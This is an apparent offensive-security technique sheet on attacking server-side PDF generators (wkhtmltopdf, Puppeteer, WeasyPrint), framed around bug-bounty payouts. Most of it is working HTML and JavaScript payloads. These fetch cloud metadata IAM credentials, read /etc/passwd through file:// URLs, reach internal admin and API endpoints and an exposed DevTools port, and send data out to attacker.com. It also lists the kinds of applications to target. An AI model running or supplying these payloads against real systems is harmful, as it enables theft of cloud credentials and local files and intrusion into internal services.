---
id: "pdf-generation-attacks"
title: "PDF Generation Attacks (SSRF & File Read)"
type: "technique"
category: "web-application"
subcategory: "ssrf"
tags: ["pdf", "ssrf", "wkhtmltopdf", "puppeteer", "weasyprint", "file-read", "html-injection", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "metadata-ssrf", "xss"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# PDF Generation Attacks (SSRF & File Read)

## Why This is Extremely Common
Any app that generates PDFs from user content (invoices, reports, tickets, resumes) likely uses a headless browser or HTML-to-PDF library. These make HTTP requests and can read local files. One of the most reliable SSRF paths. $2k–$25k.

## wkhtmltopdf SSRF
```html
<!-- Basic SSRF via tags -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
<script>document.location='http://169.254.169.254/latest/meta-data/'</script>

<!-- Local file read -->
<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>
<embed src="file:///etc/passwd" type="text/plain">
<object data="file:///etc/passwd" type="text/plain"></object>

<!-- JavaScript file read -->
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write('<pre>'+this.responseText+'</pre>')};
x.open('GET','file:///etc/passwd');
x.send();
</script>

<!-- Internal service access -->
<iframe src="http://localhost:8080/admin"></iframe>
<iframe src="http://internal-api.local/graphql?query={users{email,password}}"></iframe>
```

## Puppeteer / Headless Chrome
```html
<!-- file:// protocol -->
<iframe src="file:///etc/passwd"></iframe>

<!-- JavaScript fetch -->
<script>
fetch('file:///etc/passwd').then(r=>r.text()).then(t=>{
  document.write('<pre>'+t+'</pre>');
});
</script>

<!-- Redirect -->
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">

<!-- Chrome DevTools Protocol (if exposed on :9222) -->
<script>
fetch('http://localhost:9222/json').then(r=>r.json()).then(j=>{
  document.write(JSON.stringify(j));
});
</script>
```

## WeasyPrint
```html
<!-- Attach local files to PDF -->
<link rel="attachment" href="file:///etc/passwd">
<!-- The local file gets embedded in the PDF as an attachment -->
```

## HTML Injection in PDF Fields
```html
<!-- Inject in name/address/description fields that appear in PDFs -->
<img src="http://attacker.com/steal?data=1">
<link rel=stylesheet href="http://attacker.com/exfil">
<style>@import url('http://attacker.com/exfil');</style>
```

## Where to Find This
- Invoice/receipt generation (e-commerce, SaaS billing)
- Report/export features ("Download as PDF")
- Ticket/boarding pass generators
- Resume/CV builders
- Certificate generators
- Markdown → PDF converters
- Email → PDF archival
- Common tech: wkhtmltopdf, Puppeteer, WeasyPrint, Prince XML

## Detection
```
# Inject in every field that appears in a generated PDF:
<img src=http://COLLABORATOR>
# If Collaborator gets hit → the PDF generator makes HTTP requests
# Then escalate to file:// and metadata SSRF
```

## Tools
- Burp Suite + Collaborator for SSRF confirmation
- nuclei PDF generation templates
- Custom HTML payloads
